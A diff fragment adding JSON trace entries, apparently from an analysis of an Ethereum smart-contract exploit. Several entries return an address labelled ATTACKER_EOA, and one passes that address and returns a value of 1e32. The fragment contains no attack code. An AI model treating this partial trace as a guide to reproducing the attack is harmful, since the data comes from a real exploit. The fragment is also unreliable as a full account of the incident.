+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]"
+    },
+    {
+        "id": "494",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]"
+    },
+    {
+        "id": "611",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]"
+    },
+    {
+        "id": "864",
+        "args": "ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000000000000000 [1e32]"
+    }
+]
